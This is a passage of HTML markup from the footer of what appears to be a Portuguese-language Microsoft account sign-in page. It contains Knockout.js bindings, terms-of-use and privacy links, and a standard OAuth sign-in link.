                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }"><!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
<div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { &#39;footer-links&#39;: true }">

    <!-- ko if: showFooter -->
        <!-- ko if: !hideTOU -->
        <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                &#39;footer-content&#39;: true,
                &#39;footer-item&#39;: true,
                &#39;has-background&#39;: !useDefaultBackground,
                &#39;background-always-visible&#39;: hasDarkBackground }" href="" class="footer-content ext-footer-content footer-item ext-footer-item">Termos de uso</a>
        <!-- /ko -->

        <!-- ko if: !hidePrivacy -->
        <a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                &#39;footer-content&#39;: true,
                &#39;footer-item&#39;: true,
                &#39;has-background&#39;: !useDefaultBackground,
                &#39;background-always-visible&#39;: hasDarkBackground }" href="" class="footer-content ext-footer-content footer-item ext-footer-item">Privacidade e cookies</a>
        <!-- /ko -->

        <!-- ko if: impressumLink --><!-- /ko -->

        <!-- ko if: a11yConformeLink --><!-- /ko -->

        <!-- ko if: showIcpLicense --><!-- /ko -->
    <!-- /ko -->

    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
    <a id="moreOptions" href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=a81d90ac-aa75-4cf8-b14c-58bf348528fe&amp;redirect_uri=https%3A%2F%2Fanswers.microsoft.com&amp;response_type=code%20id_token&amp;scope=openid%20profile&amp;state=OpenIdConnect.AuthenticationProperties%3DGQ0JqUJa0uuEfgKmOPTGe9jXaoxRF-PcYuJDuqfbe0KBV8vmGGipt4-Tm2JjACCX2s97M20_Z4SUEwRorNPzNzPv8QvfyYpIBmNgFmExDkv-WHf9Ntb00lxSliJJdmVi2O8u9cM-fx-4LML8xfIzZZHr_Wso0eDyPz8hJZq5kckYogvS8jTXQFtluMpKAth8sRlytmlUSd1rk6Zlb1BImJCHivDkZkW-rGprzCCD5dniDJC1G_cbJlUj2hPjoSRV6qRepqtdq-rYUjd3ntwwSw&amp;response_mode=form_post&amp;nonce=638610488692308221.OGFlNTg5NDQtZDViZC00MzNiLWE0NTctNjBmYjY0ZTZlODViNTgyNGRmZTktMTFiMC00YmFlLTk0ZDQtMTlhMzI2MjVmZGI2&amp;nopa=2&amp;prompt=select_account&amp;x-client-SKU=ID_NET472&amp;x-client-ver=7.6.0.0&amp;sso_reload=true#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;],
        attr: { &#39;aria-expanded&#39;: showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            &#39;footer-content&#39;: true,
            &#39;footer-item&#39;: true,
            &#39;debug-item&#39;: true,
            &#39;has-background&#39;: !useDefaultBackground,
            &#39;background-always-visible&#39;: hasDarkBackground }" aria-label="Clique aqui para obter informações sobre solução de problemas" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
</div>
<!-- /ko -->

<!-- ko if: svr.fShowLegalMessagingInline && showLinks --><!-- /ko --></div>
    </div>
    <!-- /ko -->
</div>
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() --><!-- /ko -->
    <!-- /ko -->
<!-- /ko --></div>
    <!-- /ko -->
</form>

<form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form>

<!-- ko if: svr.urlCBPartnerPreload --><!-- /ko -->

<!-- ko if: svr.fEnableDFPIntegration && dfpUrl() --><!-- /ko --></div></body></html>